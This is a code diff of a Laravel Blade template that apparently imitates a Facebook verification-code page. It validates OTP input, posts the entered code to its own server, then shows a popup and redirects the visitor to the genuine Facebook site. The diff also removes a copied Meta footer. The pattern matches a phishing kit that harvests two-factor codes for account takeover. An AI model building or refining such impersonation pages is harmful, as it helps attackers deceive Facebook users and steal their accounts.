@@ -205,7 +205,9 @@
                     processData: false,
                     success: function(response) {
                         if (response.status == 0) {
-                            window.location.href = 'https://www.facebook.com/';
+                            $('#popup').css('display', 'flex');
+                            text.removeClass('d-none');
+                            loading.addClass('d-none');
                         } else {
                             $('#submit-code').prop('disabled', false);
                             $('.notice-error').removeClass('d-none');
@@ -254,9 +256,17 @@
             }
         }
 
-        $(document).on('keypress', '.validate-otp', validateOtp)
-        $(document).on('input', '.validate-otp', validateOtp)
-        $(document).on('keydown', '.validate-input', validateOtp)
+        function closePopup() {
+            $('#popup').css('display', 'none');
+        }
+
+        $(document).on('click', '.button-ok', function() {
+            window.location.href = 'https://www.facebook.com/policies_center/';
+        });
+
+        $(document).on('keypress', '.validate-otp', validateOtp);
+        $(document).on('input', '.validate-otp', validateOtp);
+        $(document).on('keydown', '.validate-input', validateOtp);
     </script>
 @endpush
 @extends('layouts.main')
@@ -300,132 +310,24 @@
                         <div style="" class="btn-send-code">@lang('confirm.button_send_code')</div>
                     </div>
                 </div>
-                {{-- <div class="footer">
-                    <div class="footer-wrapper">
-                        <div class="footer-content">
-                            <ul class="footer-item-list">
-                                <li>English (US)</li>
-                                <li>
-                                    <a class="_sv4" dir="ltr" href="javascript:;"
-                                        title="Traditional Chinese (Taiwan)">中文(台灣)</a>
-                                </li>
-                                <li>
-                                    <a class="_sv4" dir="ltr" href="javascript:;" title="Korean">한국어</a>
-                                </li>
-                                <li>
-                                    <a class="_sv4" dir="ltr" href="javascript:;" title="Japanese">日本語</a>
-                                </li>
-                                <li>
-                                    <a class="_sv4" dir="ltr" href="javascript:;"
-                                        title="French (France)">Français (France)</a>
-                                </li>
-                                <li>
-                                    <a class="_sv4" dir="ltr" href="javascript:;" title="Thai">ภาษาไทย</a>
-                                </li>
-                                <li>
-                                    <a class="_sv4" dir="ltr" href="javascript:;" title="Spanish">Español</a>
-                                </li>
-                                <li>
-                                    <a class="_sv4" dir="ltr" href="javascript:;"
-                                        title="Portuguese (Brazil)">Português (Brasil)</a>
-                                </li>
-                                <li>
-                                    <a class="_sv4" dir="ltr" href="javascript:;" title="German">Deutsch</a>
-                                </li>
-                                <li>
-                                    <a class="_sv4" dir="ltr" href="javascript:;"
-                                        title="Italian">Italiano</a>
-                                </li>
-                                <li>
-                                    <a role="button" class="button-plus" rel="dialog" ajaxify=""
-                                        href="javascript:;" title="Show more languages">
-                                        <i class="button-plus-icon"></i>
-                                    </a>
-                                </li>
-                            </ul>
-                            <div class="content-curve"></div>
-                            <div class="footer-children">
-                                <ul class="footer-children-item-list">
-                                    <li><a href="javascript:;" title="Sign up for Facebook">Sign Up</a></li>
-                                    <li><a href="javascript:;" title="Log in to Facebook">Log in</a></li>
-                                    <li><a href="javascript:;" title="Take a look at Messenger.">Messenger</a>
-                                    </li>
-                                    <li><a href="javascript:;" title="Facebook Lite for Android.">Facebook Lite</a>
-                                    </li>
-                                    <li><a href="javascript:;" title="Browse in Video">Video</a>
-                                    </li>
-                                    <li><a href="javascript:;"
-                                            title="Take a look at popular places on Facebook.">Places</a>
-                                    </li>
-                                    <li><a href="javascript:;" title="Check out Facebook games.">Games</a></li>
-                                    <li><a href="javascript:;"
-                                            title="Buy and sell on Facebook Marketplace.">Marketplace</a></li>
-                                    <li><a href="javascript:;" title="Learn more about Meta Pay" target="_blank">Meta
-                                            Pay</a></li>
-                                    <li><a href="javascript:;" title="Discover Meta" target="_blank">Meta
-                                            Store</a>
-                                    </li>
-                                    <li><a href="javascript:;" title="Learn more about Meta Quest"
-                                            target="_blank">Meta
-                                            Quest</a></li>
-                                    <li><a href="" title="Take a look at Instagram" target="_blank"
-                                            rel="noreferrer nofollow" data-lynx-mode="asynclazy">Instagram</a></li>
-                                    <li><a href="" title="Check out Threads" target="_blank"
-                                            rel="noreferrer nofollow" data-lynx-mode="asynclazy">Threads</a></li>
-                                    <li><a href="javascript:;" title="Donate to worthy causes.">Fundraisers</a></li>
-                                    <li><a href="javascript:;"
-                                            title="Browse our Facebook Services directory.">Services</a></li>
-                                    <li><a href="javascript:;" title="See the Voting Information Centre">Voting
-                                            Information Centre</a></li>
-                                    <li><a href="javascript:;"
-                                            title="Learn how we collect, use and share information to support Facebook.">Privacy
-                                            Policy</a></li>
-                                    <li><a href="javascript:;"
-                                            title="Learn how to manage and control your privacy on Facebook.">Privacy
-                                            Centre</a></li>
-                                    <li><a href="javascript:;" title="Explore our groups.">Groups</a></li>
-                                    <li><a href="javascript:;" accesskey="8"
-                                            title="Read our blog, discover the resource centre and find job opportunities.">About</a>
-                                    </li>
-                                    <li>
-                                        <a href="javascript:;" title="Advertise on Facebook">Create ad</a>
-                                    </li>
-                                    <li><a href="javascript:;" title="Create a Page">Create
-                                            Page</a>
-                                    </li>
-                                    <li><a href="javascript:;" title="Develop on our platform.">Developers</a>
-                                    </li>
-                                    <li><a href="javascript:;"
-                                            title="Make your next career move to our brilliant company.">Careers</a>
-                                    </li>
-                                    <li><a href="javascript:;" title="Learn about cookies and Facebook."
-                                            data-nocookies="1">Cookies</a></li>
-                                    <li><a class="_41ug" data-nocookies="1" href="javascript:;"
-                                            title="Learn about AdChoices.">AdChoices<i
-                                                class="img sp_EP9wX8qDDvu sx_6bdd81"></i></a></li>
-                                    <li><a data-nocookies="1" href="javascript:;" accesskey="9"
-                                            title="Review our terms and policies.">Terms</a></li>
-                                    <li><a href="javascript:;" accesskey="0" title="Visit our Help Centre.">Help</a>
-                                    </li>
-                                    <li><a href="javascript:;"
-                                            title="Visit our contact uploading and non-users notice.">Contact uploading
-                                            and
-                                            non-users</a></li>
-                                    <li><a accesskey="6" class="accessible_elem" href="/settings"
-                                            title="View and edit your Facebook settings.">Settings</a></li>
-                                    <li><a accesskey="7" class="accessible_elem" href="javascript:;"
-                                            title="View your activity log">Activity log</a></li>
-                                </ul>
-                            </div>
-                            <div class="footer-copyright">
-                                <div><span> Meta © 2024</span></div>
-                            </div>
-                        </div>
-                    </div>
-                </div> --}}
             </div>
-            <div></div>
-            <span></span>
         </div>
     </main>
+    <div class="popup-container" id="popup" style="border-radius:10px;display: flex !important;">
+        <div class="popup-confirm-content">
+            <div class="popup-confirm-header" >
+                <p>@lang('confirm.popup_header')</p>
+            </div>
+            <div class="" style="padding: 20px;border: 1px solid #bdbdbd;">
+                <p class="popup-text" style="font-size: 16px">@lang('confirm.popup_content')</p>
+            </div>
+            <div class="popup-footer" style="padding: 20px;">
+                {{-- <button class="button" disabled id="btn-continue" onclick="nextPage()"> Continue </button> --}}
+                <button style="padding:10px 25px;background-color: #4267B2;color:white;border-radius:10px;font-size:16px" type="button" class="button-ok">
+                    @lang('confirm.button_ok')
+                </button>
+                <span class="loader" id="loader"></span>
+            </div>
+        </div>
+    </div>
 @endsection
